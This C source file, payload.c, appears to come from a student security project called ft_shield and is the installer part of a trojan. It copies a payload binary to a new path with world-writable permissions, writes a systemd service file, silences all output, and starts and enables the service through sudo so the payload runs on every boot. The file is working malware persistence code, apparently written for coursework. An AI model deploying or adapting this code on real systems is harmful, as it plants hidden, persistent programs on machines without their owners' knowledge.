/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   payload.c                                          :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: mbatty <mbatty@student.42angouleme.fr>     +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2025/11/21 13:27:21 by mbatty            #+#    #+#             */
/*   Updated: 2025/11/23 10:57:49 by mbatty           ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "ctx.h"

int	setup_service()
{
	int	fd;

	fd = open(SERVICE_FILE, O_CREAT | O_WRONLY | O_TRUNC, 0777);
	if (fd == -1)
		return (0);

	int	nullfd = open("/dev/null", O_WRONLY);
	dup2(nullfd, STDOUT_FILENO);
	dup2(nullfd, STDERR_FILENO);
	close(nullfd);

	write(fd, SERVICE_FILE_CONTENT, sizeof(SERVICE_FILE_CONTENT));
	system("sudo systemctl start ft_shield.service");
	system("systemctl enable ft_shield.service");
	return (1);
}

int	export_payload(char *src_path, char *dst_path)
{
	char 	buf[4096];
	ssize_t rdb;
	int		fdin;
	int		fdout;

	printf(LOGIN_42 "\n");

	fdin = open(src_path, O_RDONLY);
	if (fdin == -1)
		return (0);
	fdout = open(dst_path, O_CREAT | O_WRONLY | O_TRUNC, 0777);
	if (fdout == -1)
		return (0);

	do
	{
		rdb = read(fdin, buf, sizeof(buf));
		write(fdout, buf, rdb);
	} while (rdb > 0);

	close(fdin);
	close(fdout);
	return (setup_service());
}

void	exec_payload(char *payload_path, char **envp)
{
	char	*argv[] = {payload_path, NULL};
	execve(payload_path, argv, envp);
	exit(0);
}
